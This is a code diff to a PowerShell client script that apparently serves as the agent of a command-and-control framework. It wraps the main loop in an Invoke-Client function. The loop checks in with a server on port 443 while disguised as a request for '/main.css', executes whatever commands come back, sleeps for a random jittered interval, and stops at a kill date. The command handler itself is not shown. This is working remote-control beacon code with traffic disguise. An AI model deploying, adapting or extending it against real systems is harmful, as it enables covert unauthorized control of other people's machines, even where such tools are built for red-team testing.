@@ -1,15 +1,6 @@
 # License: GPL-3.0
 
 ################################
-# Client.ps1 Params
-################################
-param(
-    [string]$ServerIP = "127.0.0.1",
-    [int]$Port=443,
-    [switch]$Debug=$false
-)
-
-################################
 # Client Configs
 ################################
 $Page = "/main.css"
@@ -129,42 +120,52 @@ Function Parse-HttpResponse($Data) {
 }
 
 # Check for Debug Param
-if ($Debug) { $DebugPreference = 'Continue' }
+Function Invoke-Client {
+    ################################
+    # Client.ps1 Params
+    ################################
+    param(
+        [string]$ServerIP = "127.0.0.1",
+        [int]$Port=443,
+        [switch]$Debug=$false
+    )
 
-# Main Loop
-while ($true) {
-    # Verify within dates of operation
-    $now = (Get-Date).ToString('yyyy-MM-dd')
-    $kd = (Get-Date $KillDate).ToString('yyyy-MM-dd')
-    if ($kd -gt $now)
-    {
-        try
+    if ($Debug) { $DebugPreference = 'Continue' }
+    # Main Loop
+    while ($true) {
+        # Verify within dates of operation
+        $now = (Get-Date).ToString('yyyy-MM-dd')
+        $kd = (Get-Date $KillDate).ToString('yyyy-MM-dd')
+        if ($kd -gt $now)
         {
-            # Checkin/ Get Command
-            $HttpResp = http_request("check-in")
-            $RawData = Parse-HttpResponse($HttpResp)
-            # Execute Command
-            if ($RawData)
+            try
             {
-                CmdHandler($RawData)
+                # Checkin/ Get Command
+                $HttpResp = http_request("check-in")
+                $RawData = Parse-HttpResponse($HttpResp)
+                # Execute Command
+                if ($RawData)
+                {
+                    CmdHandler($RawData)
+                }
             }
+
+            catch
+            {
+                write-warning $_.Exception.Message
+            }
+
+            # Sleep
+            $s = Get-Random -Maximum $SleepMax -Minimum $SleepMin
+            write-debug "Sleeping: $s Seconds."
+            start-sleep -Seconds $s
         }
 
-        catch
-        {
-            write-warning $_.Exception.Message
+        Else {
+            Break
         }
-
-        # Sleep
-        $s = Get-Random -Maximum $SleepMax -Minimum $SleepMin
-        write-debug "Sleeping: $s Seconds."
-        start-sleep -Seconds $s
     }
 
-    Else {
-        Break
-    }
+    # Send closing message before exiting
+    http_request($HostName + "Closed.")
 }
-
-# Send closing message before exiting
-http_request($HostName + "Closed.")
